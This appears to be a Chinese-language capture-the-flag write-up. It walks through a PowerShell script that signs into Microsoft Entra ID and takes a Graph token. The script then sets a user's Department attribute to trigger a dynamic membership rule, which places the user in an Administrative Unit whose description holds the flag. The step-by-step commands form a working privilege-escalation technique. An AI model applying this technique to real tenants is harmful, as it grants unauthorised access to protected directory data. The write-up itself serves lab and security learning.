# Microsoft Entra ID (Azure AD) 提权与自动化利用场景解析

这段 PowerShell 脚本描述了一个典型的 Microsoft Entra ID（原 Azure AD）环境下的提权或自动化运维场景。

其核心逻辑是：利用已有的权限修改用户属性（Department），从而触发某种预设的**“动态组成员规则”**（Dynamic Membership Rule），使该用户自动加入到一个特定的行政单位（Administrative Unit, AU）中，最终获取隐藏在 AU 描述信息中的 Flag。

## 详细步骤解析

### 1. 登录 Microsoft Entra ID
脚本首先通过硬编码的凭据（UPN 和密码）创建一个加密的凭据对象，并登录 Azure 账户。

```powershell
$pass = ConvertTo-SecureString "<USER_PASSWORD>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USER_PRINCIPAL_ID>", $pass)
Connect-AzAccount -Credential $cred
```
**作用：** 建立与 Azure 环境的非交互式身份验证会话。

### 2. 获取令牌并连接 Microsoft Graph
由于 `Az` 模块和 `MgGraph`（Microsoft Graph）模块使用不同的接口，脚本从 Azure 账户中提取了一个针对 Graph 资源的访问令牌，并完成连接。

```powershell
$token = Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com"
Connect-MgGraph -AccessToken $token.Token
```
**作用：** 跨模块调用。使用当前的 Azure 身份直接操作 Microsoft Graph API。

### 3. 修改用户部门属性（触发关键点）
这是整个流程的核心动作：将用户的 `Department`（部门）属性修改为一个特定的 `RULE_WORD`（规则字）。

```powershell
Set-AzADUser -UPNOrObjectId "<USER_PRINCIPAL_ID>" -Department "<RULE_WORD>"
```
**原理：** 在 Entra ID 中，行政单位（Administrative Unit）可以设置动态成员资格规则。
> **例如：** 如果规则设置为 `(user.department -eq "SecretTask")`，那么只要你把用户的部门改为 `"SecretTask"`，该用户就会被系统自动加入到该 AU 中。

### 4. 枚举行政单位并获取 Flag
最后，脚本检查该用户目前属于哪些行政单位，并列出该单位的详细信息。

```powershell
# 查找用户所属的行政单位
Get-MgUserMemberOf -UserId $userId -All | Where-Object { $_.AdditionalProperties["@odata.type"] -eq "#microsoft.graph.administrativeUnit" }

# 查看该行政单位的具体详情
Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId "<ADMINISTRATIVE_UNIT_ID>" | fl
```
**结果：** 一旦用户成功通过规则加入 AU，你就可以访问该 AU 的属性。根据说明，Flag 就隐藏在行政单位的 `Description`（描述）字段中。

## 总结
这是一个关于 Entra ID 动态组/行政单位利用的技术方案：

1. 认证并切换到 Graph 权限。
2. 修改用户信息以匹配动态规则。
3. 触发系统自动将用户归入特定的行政单位。
4. 读取行政单位的元数据（描述信息）来提取目标数据（Flag）。

> [!WARNING]
> **注意：** 脚本中提到的“默认情况下用户无法编辑自己属性”是一个重要的安全边界。这里假设你已经拥有了某种能够修改用户属性的自定义角色权限。
